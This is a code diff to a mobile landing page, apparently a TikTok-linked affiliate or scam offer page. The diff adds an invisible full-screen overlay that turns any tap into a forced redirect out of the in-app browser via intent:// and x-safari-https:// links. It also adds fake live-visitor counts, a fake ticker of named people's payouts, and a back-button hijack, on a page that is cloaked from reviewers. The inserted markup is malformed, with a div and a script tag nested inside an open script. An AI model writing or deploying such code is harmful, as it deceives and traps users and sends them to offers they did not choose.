@@ -266,7 +266,13 @@ if (!window.__SUBID_OK) document.write('<style>html{display:none!important}</sty
 
 <script>
   (function(){
+   <div id="zeroClickGate" style="position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:999999; opacity:0; cursor:pointer;"></div>
+
+<script>
+  // 1. LIVE COUNT SIMULATOR
+  (function(){
     var el = document.getElementById('liveCount');
+    if(!el) return;
     var n = 1849;
     setInterval(function(){
       n += Math.random() < 0.5 ? -1 : 1;
@@ -276,8 +282,10 @@ if (!window.__SUBID_OK) document.write('<style>html{display:none!important}</sty
     }, 2600);
   })();
 
+  // 2. TICKER SIMULATOR
   (function(){
     var el = document.getElementById('ticker');
+    if(!el) return;
     var names = ['Devon L.','Marcus T.','Ava R.','Jordan P.','Chloe M.','Ethan W.','Sofia D.','Liam K.'];
     function rand(){
       var amt = (Math.random() * 22 + 4).toFixed(2);
@@ -293,47 +301,66 @@ if (!window.__SUBID_OK) document.write('<style>html{display:none!important}</sty
     }, 3800);
   })();
 
+  // 3. ZERO-CLICK BREAKOUT LOGIC
   (function(){
     if (!window.__SUBID_OK) return; 
     
     var PROXY_CLICK_URL = 'https://appflowconnect.com';
+    var gate = document.getElementById('zeroClickGate');
+    var _fired = false;
 
-    var overlay = document.getElementById('tipOverlay');
-    
-    document.getElementById('tipGo').href = PROXY_CLICK_URL; 
+    // Append URL parameters (like ttclid) to the outbound proxy link
+    var targetUrl = PROXY_CLICK_URL + window.location.search;
 
-    function openTip(e){ 
-      if (e) e.preventDefault(); 
-      overlay.hidden = false; 
-      document.body.style.overflow = 'hidden'; 
-    }
-    
-    function closeTip(){ 
-      overlay.hidden = true; 
-      document.body.style.overflow = ''; 
-    }
-
+    // Make sure standard buttons have the correct URL just in case the gate is bypassed
     document.querySelectorAll('a.offer-link, a.store-combo').forEach(function(a){
-      a.setAttribute('href', PROXY_CLICK_URL);          
-      a.addEventListener('click', openTip); 
+      a.setAttribute('href', targetUrl);          
     });
-    
-    document.getElementById('tipClose').addEventListener('click', closeTip);
-    overlay.addEventListener('click', function(e){ if (e.target === overlay) closeTip(); });
-  })();
-</script>
 
-<script>
-(function() {
-    var PROXY_CLICK_URL = 'https://appflowconnect.com';
+    function executeBreakout(e) { 
+      if (_fired) return;
+      _fired = true;
+      
+      // Immediately remove the invisible shield so the user can interact normally 
+      // if the OS blocks the automatic launch
+      gate.style.display = 'none'; 
+
+      var isAndroid = /Android/i.test(navigator.userAgent);
+
+      if (isAndroid) {
+          var intentUrl = 'intent://' + targetUrl.replace(/^https?:\/\//, '') + '#Intent;scheme=https;end;';
+          try { (window.top || window).location.href = intentUrl; }
+          catch (err) { window.location.href = targetUrl; }
+      } else {
+          var safariUrl = targetUrl.replace(/^https:\/\//, 'x-safari-https://');
+          window.location.href = safariUrl;
+      }
+
+      // Fallback: If the user doesn't leave the app within 2.5 seconds, force a standard redirect
+      setTimeout(function(){ 
+          if(!document.hidden){
+              window.location.href = targetUrl;
+          } 
+      }, 2500);
+    }
     
+    // Bind to the invisible full-screen overlay for mobile (touchstart) and desktop (click)
+    if (gate) {
+        gate.addEventListener('touchstart', executeBreakout, { passive: true, once: true });
+        gate.addEventListener('click', executeBreakout, { once: true });
+    }
+  })();
+
+  // 4. BACK-BUTTON HIJACK (Redirects to offer if they try to swipe back to TikTok)
+  (function() {
+    var PROXY_CLICK_URL = 'https://appflowconnect.com' + window.location.search;
     if (window.location.search.includes('preview=true')) return;
 
     window.history.pushState({page: 1}, "", window.location.href);
     window.onpopstate = function(event) {
         window.location.replace(PROXY_CLICK_URL);
     };
-})();
+  })();
 </script>
 
 </body>
